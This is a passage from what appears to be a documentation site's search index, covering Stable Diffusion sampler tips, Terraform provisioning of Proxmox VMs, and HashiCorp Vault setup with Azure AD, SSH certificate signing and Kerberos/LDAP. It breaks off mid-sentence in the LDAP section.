The Old Reliable","text":"<p>k_lms at 50 steps will give you fine generations most of the time if your prompt is good. k_lms runs pretty quick, so the results will come in at a good speed as well. You could easily just stick with this setting forever at CFG 7-8 and be ok. If things are coming out looking a little cursed, you could try a higher step value, like 80. But, as a rule of thumb, make sure your higher step value is actually getting you a benefit, and you're not just wasting your time. You can check this by holding your seed and other settings steady and varying your step count up and down. You might be shocked at what a low step count can do. I'm very skeptical of people who say their every generation is 150 steps.</p>"},{"location":"content/devops/stablediffusion/#ddim-the-speed-demon","title":"DDIM: The Speed Demon","text":"<p>DDIM at 8 steps (yes, you read that right. 8 steps) can get you great results at a blazing fast speed. This is a wonderful setting for generating a lot of images quickly. When I'm testing new prompt ideas, I'll set DDIM to 8 steps and generate a batch of 4-9 images. This gives you a fantastic birds eye view of how your prompt does across multiple seeds. This is a terrific setting for rapid prompt modification. You can add one word to your prompt at DDIM:8 and see how it affects your output across seeds in less than 5 seconds (graphics card depending). For more complex prompts, DDIM might need more help. Feel free to go up to 15, 25, or even 35 if your output is still coming out looking garbled (or is the prompt the issue??). You'll eventually develop an eye for when increasing step count will help. Same rule as above applies, though. Don't waste your own time. Every once in a while make sure you need all those steps.</p>"},{"location":"content/devops/stablediffusion/#euler-a-the-chameleon","title":"Euler a: The Chameleon","text":"<p>Everything that applies to DDIM applies here as well. This sampler is also lightning fast and also gets great results at extremely low step counts (steps 8-16). But it also changes generation style a lot more. Your generation at step count 15 might look very different than step count 16. And then they might BOTH look very different than step count 30. And then THAT might be very different than step count 65. This sampler is wild. It's also worth noting here in general: your results will look TOTALLY different depending on what sampler you use. So don't be afraid to experiment. If you have a result you already like a lot in k_euler_a, pop it into DDIM (or vice versa).</p>"},{"location":"content/devops/stablediffusion/#dpm2-a-the-starving-artist","title":"DPM2 a: The Starving Artist","text":"<p>In my opinion, this sampler might be the best one, but it has serious tradeoffs. It is VERY slow compared to the ones I went over above. However, for my money, k_dpm_2_a in the 30-80 step range is very very good. It's a bad sampler for experimentation, but if you already have a prompt you love dialed in, let it rip. Just be prepared to wait. And wait. If you're still at the stage where you're adding and removing terms from a prompt, though, you should stick to k_euler_a or DDIM at a lower step count.</p>"},{"location":"content/devops/stablediffusion/#sampling-steps","title":"Sampling Steps","text":"<p>The AI model starts from random noise and then iteratively denoises the image until you get your final image. This modifier decides how many denoising steps it will go through. Default is 50, which is perfect for most scenarios. For reference, at around 10 steps you have generally a good idea of the composition and whether you will like that image or not, at around 20 it becomes very close to finished. If cfg_scale and sampler are at default settings, then the difference 20 steps and 150 (the maximum) is often times hard to tell. So if you want to increase the speed at which your images are generated try lowering the steps. Increasing steps also often adds finer detail and fixes artifacts (often but not always).</p> <p>Steps: </p> <ul> <li>Many problems that can be solved with a higher step count can also be solved with better prompting. If your subject's eyes are coming out terribly, try adding stuff to your prompt talking about their \"symmetric highly detailed eyes, fantastic eyes, intricate eyes\", etc. This isn't a silver bullet, though. Eyes, faces, and hands are difficult, non-trivial things to prompt to. Don't be discouraged. Keep experimenting, and don't be afraid to remove things from a prompt as well.</li> </ul>"},{"location":"content/devops/stablediffusion/#denoising","title":"Denoising","text":"<p>De-Noising is how close to the image you want it. Less is closer. Think of de-noising as de-constructing your image to be something else. The higher, the more it removes your image as a reference. Probably, not how it technically works, but it makes sense when explaining and trying for yourself.</p>"},{"location":"content/devops/stablediffusion/#seed","title":"Seed","text":"<p>A good seed can enforce stuff like composition and color across a wide variety of prompts, samplers, and CFGs. Say you have a nice prompt that outputs a portrait shot of a \"brunette\" woman. You run this a few times and find a generation that you like. Grab that particular generation's seed to hold it steady and change the prompt to a \"blonde\" woman instead. The woman will be in an identical or very similar pose but now with blonde hair.</p> <ul> <li>Use DDIM:8-16 to go seed hunting with your prompt.</li> <li>If you're mainly looking for a fun prompt that gets consistently good results, seed is less important.</li> </ul>"},{"location":"content/devops/terraform/","title":"Hashicorp Terraform","text":"<p>Info</p> <p>Terraform Homepage | Terraform Documentation | Terraform Proxmox provider | jamlab-terraform</p> <p>Terraform is an infrastructure as code tool that lets you build, change, and version infrastructure safely and efficiently. This includes low-level components like compute instances, storage, and networking, as well as high-level components like DNS entries and SaaS features.</p> <p>jamlab-terraform: Terraform configurations for provisioning homelab VMs.</p>"},{"location":"content/devops/terraform/#usage","title":"Usage","text":"<p>With existing VM template(s) built with Proxmox Builder (ISO) it is possible to provision VMs with Terraform extra fast using Terraform Proxmox provider.</p>"},{"location":"content/devops/terraform/#initializing-and-verifying-configuration","title":"Initializing and verifying configuration","text":"<p>Initialize the configuration directory to download and install the providers defined in the configuration:</p> Bash<pre><code>terraform init\n</code></pre> <p>Format your configurations. Terraform will print out the names of the files it modified, if any:</p> Bash<pre><code>terraform fmt\n</code></pre> <p>Make sure your configuration is syntactically valid and internally consistent</p> Bash<pre><code>terraform validate\n</code></pre>"},{"location":"content/devops/terraform/#provisioning","title":"Provisioning","text":"<p>Execute a dry run to verify configuration and see what would be done before executing apply:</p> Bash<pre><code>terraform plan\n</code></pre> <p>Apply the plan and provision infrastructure as declared in configurations:</p> Bash<pre><code>terraform apply\n</code></pre> <p>Note: use the <code>-auto-approve</code> flag to skip interactive approval of plan before applying.</p> <p>Unprovision infrastructure as declared in configurations:</p> Bash<pre><code>terraform destroy\n</code></pre> <p>Using <code>-compact-warnings</code> flag will compact output, but still outputs errors in full.</p>"},{"location":"content/devops/terraform/#targeting-specific-resources","title":"Targeting specific resources","text":"<p>Any resources defined in <code>main.tf</code> can be targeted by using <code>-target=\"&lt;RESOURCE&gt;.&lt;RESOURCE NAME&gt;\"</code>.</p> <p>For example, target <code>base-infra</code> module:</p> Bash<pre><code>terraform apply -target=module.base-infra\n</code></pre>"},{"location":"content/devops/terraform/#structure","title":"Structure","text":"Text Only<pre><code>main.tf                      # Main file used by Terraform commands\nvariables.tf                 # Global variables\n\nmodules/                     # Reusable modules\n    pve-vm/                  # Proxmox VE VM provisioning template module\n\nenvs/                        # Environments dir\n    prod/                    # Production infra definitions\n        base-infra/          # Base infrastructure needed for services\n            vars.tf          # Input variables\n            outputs.tf       # Output variables\n            main.tf          # Resources to be provisioned using modules\n        service-infra/       # Services infrastructure\n    dev/                     # Development infra definitions\n       dev-vm/               # Development VM\n</code></pre>"},{"location":"content/devops/terraform/#creating-multiple-of-similar-resource","title":"Creating multiple of similar resource","text":"<p>Create variable to be looped over with the values that will be used for each loop:</p> Text Only<pre><code>variable \"vms\" {\n  description = \"Base Infrastructure Virtual Machines\"\n  type = map\n  default = {\n  vm0 = {\n        name = \"vb0\"\n        ip   = \"192.168.0.120\"\n    }\n  vm1 = {\n        name = \"vb1\"\n        ip   = \"192.168.0.121\"\n  }\n }\n}\n</code></pre> <p>And then use <code>for_each</code> to use the variable to be looped over using the values with keyword <code>each.value.&lt;VALUE INSIDE LOOPED VARIABLE&gt;</code>:</p> Text Only<pre><code>module \"vm\" {\n  for_each = var.vms\n  source = \"../../../modules/pve-vm\" \n\n  target_node = local.default_target_node\n  clone = local.default_clone\n  vm_name = each.value.name\n  desc = local.desc\n  ipconfig0 = \"ip=${each.value.ip}${local.cidr},gw=${local.gateway}\"\n  ip_address = \"${each.value.ip}\"\n...\n</code></pre>"},{"location":"content/devops/vaultad/","title":"Hashicorp Vault integration with AD and SSH signing","text":""},{"location":"content/devops/vaultad/#vault","title":"Vault","text":"<p>Vault is an identity-based secrets and encryption management system. A secret is anything that you want to tightly control access to, such as API encryption keys, passwords, or certificates. Vault provides encryption services that are gated by authentication and authorization methods. Using Vault's UI, CLI, or HTTP API, access to secrets and other sensitive data can be securely stored and managed, tightly controlled (restricted), and auditable.</p> <p>Hashicorp Vault documentation</p>"},{"location":"content/devops/vaultad/#first-setup-for-back-end","title":"First setup for back-end","text":"<p>Copy <code>vault.hcl</code> to <code>/etc/vault.d/</code> and start the back-end:</p> <ul> <li>Manually...</li> </ul> Bash<pre><code>sudo nohup vault server -config=/etc/vault.d/vault.hcl &gt; /var/log/vault-manual.log &amp;\n</code></pre> <ul> <li>...or as a systemd service</li> </ul> Bash<pre><code>sudo systemctl enable vault.service &amp;&amp; sudo systemctl start vault.service\n</code></pre> <p>Then initialize the host and NOTE DOWN THE GENERATED KEYS:</p> Bash<pre><code>vault operator init\n</code></pre> <p>Vault starts in a sealed state, to unseal, use the following command three times:</p> Bash<pre><code>vault operator unseal\n</code></pre> <p>Back-end should now be running and Vault should be unsealed.</p>"},{"location":"content/devops/vaultad/#write-policies","title":"Write policies","text":"<p>Create <code>hpc-default</code> policy. Applied to all logins with AD group <code>HPC Centre</code>:</p> Bash<pre><code>vault policy write hpc-default hpc-default.hcl\n</code></pre>"},{"location":"content/devops/vaultad/#azure-ad-authentication-method-setup","title":"Azure AD authentication method setup","text":"<p>NOTE: users with over 200 groups might run into problems. Additional setup needed to accommodate users with over 200 groups. Check the relevant chapter in Vault official docs HERE!</p> <p>Authenticate as root with the generated root token:</p> Bash<pre><code>vault login\n</code></pre> <p>Enable OIDC auth:</p> Bash<pre><code>vault auth enable oidc\n</code></pre> <p>Configure OIDC for Azure AD with the default role:</p> Bash<pre><code>AUTH0_DOMAIN=\"login.microsoftonline.com/&lt;YOUR-TENANT-ID-HERE&gt;/v2.0\"\nAUTH0_CLIENT_ID=\"&lt;YOUR-AZURE-APP-ID-HERE&gt;\"\nAUTH0_CLIENT_SECRET=\"&lt;YOUR-AZURE-APP-SECRET-HERE&gt;\"\nAUTH0_DEFAULT_ROLE=\"aad\"\n\nvault write auth/oidc/config \\\n   oidc_discovery_url=\"https://$AUTH0_DOMAIN\" \\\n   oidc_client_id=\"$AUTH0_CLIENT_ID\" \\\n   oidc_client_secret=\"$AUTH0_CLIENT_SECRET\" \\\n   default_role=\"$AUTH0_DEFAULT_ROLE\"\n</code></pre> <p>Configure the default role</p> Bash<pre><code>AUTH0_USER_CLAIM=\"email\"\nAUTH0_ALLOWED_REDIRECT_URI=\"http://localhost:8250/oidc/callback,$VAULT_ADDR/ui/vault/auth/oidc/oidc/callback\"\nAUTH0_HPC_POLICY=\"default\"\nAUTH0_TTL=\"1h\"\nAUTH0_OIDC_SCOPES=\"profile\"\nHPC_AZURE_GROUP_ID=\"&lt;YOUR-AZURE-APP-ID-HERE&gt;\"\n\n\nvault write auth/oidc/role/aad -&lt;&lt;EOF\n{\n  \"user_claim\": \"$AUTH0_USER_CLAIM\",\n  \"allowed_redirect_uris\": \"$AUTH0_ALLOWED_REDIRECT_URI\",\n  \"policies\": \"$AUTH0_HPC_POLICY\",\n  \"ttl\": \"$AUTH0_TTL\",\n  \"oidc_scopes\": \"$AUTH0_OIDC_SCOPES\",\n  \"bound_claims\": { \"groups\": [\"$HPC_AZURE_GROUP_ID\"] }\n}\nEOF\n</code></pre> <p>Link default role and policy for users with AD group <code>HPC Centre</code>:</p> Bash<pre><code>AUTH0_ACCESSOR=$(vault auth list -format=json | jq -r '.\"oidc/\".accessor')\nHPC_VAULT_GROUP_NAME=\"HPC Centre\"\nHPC_VAULT_GROUP_POLICY=\"hpc-default\"\nHPC_VAULT_GROUP_ID=$(vault write \\\n   -field=id -format=table \\\n   identity/group \\\n   name=\"$HPC_VAULT_GROUP_NAME\" \\\n   type=\"external\" \\\n   policies=\"$HPC_VAULT_GROUP_POLICY\")\n\nvault write identity/group-alias \\\n   name=\"$HPC_AZURE_GROUP_ID\" \\\n   mount_accessor=\"$AUTH0_ACCESSOR\" \\\n   canonical_id=\"$HPC_VAULT_GROUP_ID\"\n</code></pre>"},{"location":"content/devops/vaultad/#keyvalue-version-1-engine-setup","title":"Key/Value version 1 engine setup","text":"<p>The <code>kv</code> secrets engine is used to store arbitrary secrets within the configured physical storage for Vault. Writing to a key in the <code>kv</code> backend will replace the old value; sub-fields are not merged together.</p> <p>Enable a version 1 kv for personal secrets:</p> Bash<pre><code>vault secrets enable -path=\"personal\" kv\n</code></pre> <p>According to <code>hpc-default</code> policy:</p> <ul> <li>Every <code>HPC Centre</code> group user can store personal secrets that only they can modify and read at the templated path <code>personal/{{identity.entity.aliases.$AUTH0_ACCESSOR.name}}/*</code></li> <li>Every <code>HPC Centre</code> group user can create write-only secrets to any other users path <code>personal/*</code> (Existing values can not be modified/overwritten).</li> </ul> <p>Enable a version 1 kv for general secrets:</p> Bash<pre><code>vault secrets enable -path=\"secret\" kv\n</code></pre> <p>General secrets should follow a defined structure that is agreed upon beforehand. The more granular the paths are, the easier it will be to manage these secrets as the amount of secrets grows. In essence paths should be something like the following example:</p> Bash<pre><code>secret/\n\u251c\u2500\u2500 hpc-default/\n\u2502   \u2514\u2500\u2500 base/\n\u2502        \u2514\u2500\u2500 testsecret=\"Sup3rS3cr3t\"\n\u2502\n\u251c\u2500\u2500 hpc-sysadmin/\n\u2502   \u2514\u2500\u2500 clusters/\n\u2502        \u251c\u2500\u2500 amp/\n\u2502        \u251c\u2500\u2500 grey/\n\u2502        \u2514\u2500\u2500 green/\n\u2502\n\u2514\u2500\u2500 hpc-dev/\n    \u2514\u2500\u2500 invenio/\n</code></pre>"},{"location":"content/devops/vaultad/#userpass-authentication-method-setup","title":"Userpass authentication method setup","text":"<p>The <code>userpass</code> auth method allows users to authenticate with Vault using a username and password combination.</p> <p>Userpasses have to be made manually and can then be linked with other entities, like the one generated by logging in via OIDC Azure AD method.</p> <p>Enable <code>userpass</code> auth method:</p> Bash<pre><code>vault auth enable userpass\n</code></pre> <p>Then create new user with a random password:</p> Bash<pre><code>vault write auth/userpass/users/&lt;YOUR-USER-HERE&gt; password=&lt;RANDOM-PASS-HERE&gt;\n</code></pre> <p>And then link it with the users entity identity manually via the GUI from <code>Access &gt; Entities &gt; USERS-ENTITY &gt; Add alias</code> with <code>Name</code> field value as the same name as entered in the step before and with <code>Auth Backend</code> as <code>userpass/ (userpass)</code>.</p> <p>Then, according to <code>hpc-default</code> policy, the user can change their password with:</p> Bash<pre><code>vault write auth/userpass/users/&lt;YOUR-USER-HERE&gt; password=\"&lt;THEIR-NEW-PASS-HERE&gt;\"\n</code></pre>"},{"location":"content/devops/vaultad/#client-ssh-key-signing-setup","title":"Client SSH key signing setup","text":"<p>Mount the <code>ssh-client-signer</code> secrets engine:</p> Bash<pre><code>vault secrets enable -path=ssh-client-signer ssh\n</code></pre> <p>Configure Vault with a CA for signing client keys using the <code>/config/ca</code> endpoint. If you do not have an internal CA, Vault can generate a keypair for you:</p> Bash<pre><code>vault write ssh-client-signer/config/ca generate_signing_key=true\n</code></pre> <p>If you already have a keypair, specify the public and private key parts as part of the payload:</p> Bash<pre><code>vault write ssh-client-signer/config/ca \\\n    private_key=\"...\" \\\n    public_key=\"...\"\n</code></pre>"},{"location":"content/devops/vaultad/#host-machines-setup","title":"Host machine(s) setup","text":"<p>Add the public key to all target host's SSH configuration. This process can be manual or automated using a configuration management tool. The public key is accessible via the API and does not require authentication.</p> <p>Use:</p> Bash<pre><code>curl -o /etc/ssh/trusted-user-ca-keys.pem $VAULT_ADDR/v1/ssh-client-signer/public_key\n</code></pre> <p>Or:</p> Bash<pre><code>vault read -field=public_key ssh-client-signer/config/ca &gt; /etc/ssh/trusted-user-ca-keys.pem\n</code></pre> <p>Add the path where the public key contents are stored to the SSH configuration file at <code>/etc/ssh/sshd_config</code> as the <code>TrustedUserCAKeys</code> option:</p> Text Only<pre><code>TrustedUserCAKeys /etc/ssh/trusted-user-ca-keys.pem\n</code></pre> <p>Create AuthorizedPrincipalsFile file structure:</p> Bash<pre><code>mkdir /etc/ssh/auth_principals/\n</code></pre> <p>Create principals with users that can authenticate inside them. With this example  can authenticate to <code>ubuntu@host</code>: Bash<pre><code>sudo echo \"&lt;VAULT-USER-HERE&gt;\" &gt; ubuntu\n</code></pre> <p>Add the path where the principals are stored to the SSH configuration file at <code>/etc/ssh/sshd_config</code> as the <code>AuthorizedPrincipalsFile</code> option:</p> Bash<pre><code>AuthorizedPrincipalsFile /etc/ssh/auth_principals/%u\n</code></pre> <p>It is good practice to also disable password auth via SSH at the configuration file at <code>/etc/ssh/sshd_config</code>:</p> Text Only<pre><code>ChallengeResponseAuthentication\nnoPasswordAuthentication no\n</code></pre> <p>Restart <code>sshd</code> service:</p> Bash<pre><code>sudo systemctl restart sshd\n</code></pre> <p>Then create separate roles for each user to have granular management over each user. NOTE: setting <code>algorithm_signer</code> is especially important (Valid values are <code>ssh-rsa</code>, <code>rsa-sha2-256</code>, and <code>rsa-sha2-512</code>), as <code>ssh-rsa</code> is the default but now considered insecure. Note that <code>allowed_users</code> controls the principals the Vault user is allowed to sign and connect with. If you need to restrict someone's SSH access, just change their roles <code>allowed_users</code> field. Example:</p> Bash<pre><code>vault write ssh-client-signer/roles/my-role -&lt;&lt;\"EOH\"\n{\n  \"algorithm_signer\": \"rsa-sha2-512\",\n  \"allow_user_certificates\": true,\n  \"allowed_users\": \"*\",\n  \"allowed_extensions\": \"permit-pty,permit-port-forwarding\",\n  \"default_extensions\": [\n    {\n      \"permit-pty\": \"\"\n    }\n  ],\n  \"key_type\": \"ca\",\n  \"default_user\": \"ubuntu\",\n  \"ttl\": \"8h\"\n}\nEOH\n</code></pre> <p>It is beneficial for SSH key signing roles use templating to avoid manual policy creations. At the time of writing <code>hpc-default.hcl</code> used <code>ssh-client-signer/sign/{{identity.entity.aliases.&lt;USERPASS-ACCESSOR-ID-HERE&gt;.name}}</code> for templating. Which means SSH key signing roles must match <code>userpass</code> auth method names (which also have to be created manually).</p>"},{"location":"content/devops/vaultad/#client-side-setup","title":"Client side setup","text":"<p>Ask Vault to sign your public key. <code>valid_principals</code> field MUST match <code>ssh-client-signer/sign/&lt;YOUR-ROLE-HERE&gt;</code> role's <code>allowed_users</code>:</p> Bash<pre><code>vault write -field=signed_key ssh-client-signer/sign/sample-role \\\n public_key=@$HOME/.ssh/alice-key.pub valid_principals=sample &gt; ~/.ssh/alice-signed-key.pub\n</code></pre> <p>To customize the signing options, use a JSON payload:</p> Bash<pre><code>vault write ssh-client-signer/sign/my-role -&lt;&lt;\"EOH\"\n{\n  \"public_key\": \"ssh-rsa AAA...\",\n  \"valid_principals\": \"my-user\",\n  \"key_id\": \"custom-prefix\",\n  \"extensions\": {\n    \"permit-pty\": \"\",\n    \"permit-port-forwarding\": \"\"\n  }\n}\nEOH\n</code></pre> <p>(Optional) View enabled extensions, principals, and metadata of the signed key:</p> Bash<pre><code>ssh-keygen -Lf ~/.ssh/signed-cert.pub\n</code></pre> <p>SSH into the host machine using the signed key. You must supply both the signed public key from Vault and the corresponding private key as authentication to the SSH call:</p> Bash<pre><code>ssh -i signed-cert.pub -i ~/.ssh/id_rsa username@host\n</code></pre>"},{"location":"content/devops/vaultad/#host-ssh-key-signing-setup-not-tested-as-of-writing","title":"Host SSH key signing setup (not tested as of writing)","text":"<p>Mount the <code>ssh-host-signer</code> secrets engine:</p> Bash<pre><code>vault secrets enable -path=ssh-host-signer ssh\n</code></pre> <p>Configure Vault with a CA for signing client keys using the <code>/config/ca</code> endpoint. If you do not have an internal CA, Vault can generate a keypair for you:</p> Bash<pre><code>vault write ssh-host-signer/config/ca generate_signing_key=true\n</code></pre> <p>If you already have a keypair, specify the public and private key parts as part of the payload:</p> Bash<pre><code>vault write ssh-host-signer/config/ca \\\n    private_key=\"...\" \\\n    public_key=\"...\"\n</code></pre> <p>Extend host key certificate TTLs:</p> Bash<pre><code>vault secrets tune -max-lease-ttl=87600h ssh-host-signer\n</code></pre> <p>Create a role for signing host keys. Be sure to fill in the list of allowed domains:</p> Bash<pre><code>vault write ssh-host-signer/roles/hostrole \\\n    key_type=ca \\\n    ttl=87600h \\\n    allow_host_certificates=true \\\n    allowed_domains=\"localdomain,example.com\" \\\n    allow_subdomains=true\n</code></pre> <p>Sign the host's SSH public key:</p> Bash<pre><code>vault write ssh-host-signer/sign/hostrole \\\n    cert_type=host \\\n    public_key=@/etc/ssh/ssh_host_rsa_key.pub\n</code></pre> <p>Set the resulting signed certificate as <code>HostCertificate</code> in the SSH configuration on the host machine:</p> Bash<pre><code>vault write -field=signed_key ssh-host-signer/sign/hostrole \\\n    cert_type=host \\\n    public_key=@/etc/ssh/ssh_host_rsa_key.pub &gt; /etc/ssh/ssh_host_rsa_key-cert.pub\n</code></pre> <p>Set permissions on the certificate to be <code>0640</code>:</p> Bash<pre><code>chmod 0640 /etc/ssh/ssh_host_rsa_key-cert.pub\n</code></pre> <p>Add host key and host certificate to the SSH configuration file at <code>/etc/ssh/sshd_config</code>:</p> Text Only<pre><code># For host keys\nHostKey /etc/ssh/ssh_host_rsa_key\nHostCertificate /etc/ssh/ssh_host_rsa_key-cert.pub\n</code></pre> <p>Restart <code>sshd</code> service:</p> Bash<pre><code>sudo systemctl restart sshd\n</code></pre>"},{"location":"content/devops/vaultad/#client-side-host-verification","title":"Client-Side Host Verification","text":"<p>Retrieve the host signing CA public key to validate the host signature of target machines.</p> <p>Use:</p> Bash<pre><code>curl $VAULT_ADDR/v1/ssh-host-signer/public_key\n</code></pre> <p>Or:</p> Bash<pre><code>vault read -field=public_key ssh-host-signer/config/ca\n</code></pre>"},{"location":"content/devops/vaultad/#backup-setup","title":"Backup setup","text":"<p>This assumes that Raft is used as the storage back-end.</p> <p>Create a backup:</p> <ul> <li>Manually:</li> </ul> Bash<pre><code>vault operator raft snapshot save demo.snapshot\n</code></pre> <ul> <li>Automatically with schedule via CLI:</li> </ul> Bash<pre><code>vault write sys/storage/raft/snapshot-auto/config/daily interval=\"24h\" retain=5 path_prefix=\"raft-backup\" storage_type=\"local\" local_max_space=1073741824\n</code></pre> <p>Automatically with schedule with:</p> Bash<pre><code>vault read sys/storage/raft/snapshot-auto/config/daily\n</code></pre> <p>Restore with:</p> Bash<pre><code>vault operator raft snapshot restore demo.snapshot\n</code></pre>"},{"location":"content/devops/vaultad/#other-secret-engines-and-use-cases","title":"Other secret engines and use cases","text":"<p>Vault provides more secret engines and use cases that may be of use but were not covered in this test/demo.</p>"},{"location":"content/devops/vaultad/#using-keyvalue-engine-as-a-way-to-track-and-renew-ssl-certs","title":"Using Key/Value engine as a way to track and renew SSL certs","text":"<p>Certificates get issued after Let's Encrypt validates that users control the domain names in those certificates using the ACME API and \"challenges\". The most popular ones are the HTTP-01 and the DNS-01. The first requires users to get a particular file and serve it via HTTP or HTTPS, so that the Let's Encrypt servers are able to retrieve it. The latter uses DNS records respectively, so that Let's Encrypt can validate the domain ownership via queries. There are already many clients which ease both of those processes with EFF's Certbot being the most prominent one.</p> <p>Certbot supports certificate creation and renewal using both challenge types. For dealing with multiple domain names from one server, HTTP-01 challenges seem to be cumbersome: Certbot must serve some traffic on ports 80 and 443 for the Let's Encrypt servers to validate the domains. DNS-01 challenges are better on this perspective, but still this is not to be considered cloud-ready for two reasons:</p> <ul> <li>The certificate state is stored locally on the server</li> <li>The renewal process depends on a running cronjob of the same server</li> </ul> <p>To tackle with the first point, could still use Certbot, but store certificates, tokens etc. in Vault.</p>"},{"location":"content/devops/vaultad/#vault-engines-not-covered-in-test","title":"Vault engines not covered in test","text":"<p>Database engine</p> <p>The database secrets engine generates database credentials dynamically based on configured roles. It works with a number of different databases through a plugin interface. There are a number of built-in database types, and an exposed framework for running custom database types for extendability. This means that services that need to access a database no longer need to hardcode credentials: they can request them from Vault, and use Vault's leasing mechanism to more easily roll keys. These are referred to as \"dynamic roles\" or \"dynamic secrets\".</p> <p>Since every service is accessing the database with unique credentials, it makes auditing much easier when questionable data access is discovered. You can track it down to the specific instance of a service based on the SQL username.</p> <p>PKI Secrets Engine</p> <p>The PKI secrets engine generates dynamic X.509 certificates. With this secrets engine, services can get certificates without going through the usual manual process of generating a private key and CSR, submitting to a CA, and waiting for a verification and signing process to complete. Vault's built-in authentication and authorization mechanisms provide the verification functionality.</p> <p>By keeping TTLs relatively short, revocations are less likely to be needed, keeping CRLs short and helping the secrets engine scale to large workloads. This in turn allows each instance of a running application to have a unique certificate, eliminating sharing and the accompanying pain of revocation and rollover.</p> <p>In addition, by allowing revocation to mostly be forgone, this secrets engine allows for ephemeral certificates. Certificates can be fetched and stored in memory upon application startup and discarded upon shutdown, without ever being written to disk.</p> <p>Transit Secrets Engine</p> <p>The transit secrets engine handles cryptographic functions on data in-transit. Vault doesn't store the data sent to the secrets engine. It can also be viewed as \"cryptography as a service\" or \"encryption as a service\". The transit secrets engine can also sign and verify data; generate hashes and HMACs of data; and act as a source of random bytes.</p> <p>The primary use case for transit is to encrypt data from applications while still storing that encrypted data in some primary data store. This relieves the burden of proper encryption/decryption from application developers and pushes the burden onto the operators of Vault.</p> <p>Key derivation is supported, which allows the same key to be used for multiple purposes by deriving a new key based on a user-supplied context value. In this mode, convergent encryption can optionally be supported, which allows the same input values to produce the same ciphertext.</p> <p>Datakey generation allows processes to request a high-entropy key of a given bit length be returned to them, encrypted with the named key. Normally this will also return the key in plaintext to allow for immediate use, but this can be disabled to accommodate auditing requirements.</p>"},{"location":"content/devops/vaultad/#securitythreat-model","title":"Security/Threat model","text":"<p>Some risks:</p> <ul> <li>Vault traffic might be eavesdropped</li> <li>Solution: Disable unencrypted HTTP comms, only use TLS encrypted traffic.</li> <li>User with signed SSH key might insert their own key to authorized keys list.</li> <li>Solution: Restrict machine user permissions.</li> <li>Solution: Schedule automatic SSH configuration deployment that clears dirs and inserts up-to-date configs to machines.</li> <li>Signed SSH key most likely TTL left after revoking SSH signing permissions.</li> <li>Solution: Admin generates new CA key.</li> <li>Authenticated user might have TTL left after revoking auth permissions.</li> <li>Solution: Disable/delete auth entity.</li> </ul>"},{"location":"content/devops/vaultkrb/","title":"Hashicorp Vault integration with Kerberos/LDAP","text":""},{"location":"content/devops/vaultkrb/#what-is-vault","title":"What is Vault?","text":"<p>Vault is an identity-based secrets and encryption management system. A secret is anything that you want to tightly control access to, such as API encryption keys, passwords, or certificates. Vault provides encryption services that are gated by authentication and authorization methods. Using Vault's UI, CLI, or HTTP API, access to secrets and other sensitive data can be securely stored and managed, tightly controlled (restricted), and auditable.</p> <p>Examples of Vault use cases:</p> <ul> <li>Automated PKI Infrastructure</li> <li>Data Encryption &amp; Tokenization</li> <li>Database Credential Rotation</li> <li>Dynamic Secrets</li> <li>Identity-based Access</li> <li>Key Management</li> <li>Kubernetes Secrets</li> <li>Secrets Management</li> </ul>"},{"location":"content/devops/vaultkrb/#why-vault-is-especially-significant-in-tandem-with-kerberos","title":"Why Vault is especially significant in tandem with Kerberos","text":"<p>CERN is a bit different in one crucial way: there is extra trust between the inventory (inventory management system, network DB, DNS) and the Kerberos authentication.</p> <p>If provisioning takes care of both building a machine and adding it to inventory, then provided that the provisioning process and inventory can be trusted you can add a link between inventory and Kerberos auth.</p> <p>Machines can (and already do!) ask for authentication with Kerberos automatically (on first boot for example), then Kerberos itself verifies machine credentials with inventory to authenticate it.</p> <p>This needs pretty tight ACLs and very good trust in security and administration of inventory and Kerberos, but done correctly solves the zero secret problem - no more need to manually insert secrets.</p> <p>On successful authentication the machine can request internally trusted self-signed certificates from the CA. If we already trust this process then asking for stored (Hashicorp Vault) or encrypted (SOPS, Ansible Vault) configuration secrets is a possibility as well. This opens a whole can of security worms, but a whole world of possibilites too!</p>"},{"location":"content/devops/vaultkrb/#how-do-i-access-vault","title":"How do I access Vault?","text":"<p>Use the CLI tool, by installing it and setting your environment variable <code>VAULT_ADDR='https://vault.cern.ch:8200'</code></p> <p>OR</p> <p>Use the web UI by navigating to https://vault.cern.ch:8200 in your browser and log in using LDAP method by using your CERN account credentials.</p>"},{"location":"content/devops/vaultkrb/#admin-guide","title":"ADMIN GUIDE","text":"<p>Following sections describes what the Vault back-end admin must do in order to enable LDAP and Kerberos integrations to work with CERN auth methods and also how to map LDAP groups to Vault policies.</p>"},{"location":"content/devops/vaultkrb/#necessary-first-step","title":"Necessary first step","text":"<p>Current CERN Kerberos configuration includes the lines which are incompatible with Vault as parsing these lines leads Vault to believe that the Kerberos is using v4 instead of v5:</p> Text Only<pre><code>v4_name_convert = {\n  host = {\n    rcmd = host\n  }\n}\n</code></pre> <p>Duplicate Kerberos configuration:</p> Bash<pre><code>cp /etc/krb5.conf /etc/krb5.conf.nov4\n</code></pre> <p>Remove incompatible Kerberos v4 lines (the following command finds the line <code>v4_name_convert</code> and deletes it + 4 lines after it in a file):</p> Bash<pre><code>sed -i \"$(grep -n v4_name_convert /etc/krb5.conf.nov4 | cut -d : -f1),$(expr $(grep -n v4_name_convert /etc/krb5.conf.nov4 | cut -d : -f1) + 4)d\" /etc/krb5.conf.nov4\n</code></pre>"},{"location":"content/devops/vaultkrb/#ldap-config-user-auth","title":"LDAP config (user auth)","text":"<p>Official Vault LDAP documentation and API documentation.</p> <p>Enable the LDAP auth method:</p> Bash<pre><code>vault auth enable ldap\n</code></pre> <p>Configure the LDAP auth method (for user auth):</p> Bash<pre><code>vault write auth/ldap/config \\\n  binddn=\"CN=&lt;SERVICE_USER&gt;,OU=Users,OU=Organic Units,DC=cern,dc=ch\" \\\n  bindpass=\"&lt;SERVICE_PASSWORD&gt;\" \\\n  url=\"ldap://cerndc.cern.ch\" \\\n  userattr=sAMAccountName \\\n  userdn=\"DC=cern,DC=ch\" \\\n  groupfilter=\"(&amp;(objectClass=group)(member:1.2.840.113556.1.4.1941:={{.UserDN}}))\" \\\n  groupattr=memberOf \\\n  groupdn=\"OU=Workgroups,DC=cern,DC=ch\" \\\n  certificate=\"@/etc/openldap/cacerts/CERN_Root_Certification_Authority_2.pem\" \\\n  insecure_tls=false \\\n  starttls=true \\\n  discoverdn=false \\\n  case_sensitive_names=true \\\n  use_token_groups=true \\\n  upndomain=\"\" \\\n  username_as_alias=true\n</code></pre> <p>Arguments in detail:</p> <ul> <li>binddn - Distinguished name of object to bind when performing user and group search. Example: <code>cn=vault,ou=Users,dc=example,dc=com</code>. Used together with <code>bindpass</code> argument.</li> <li>bindpass 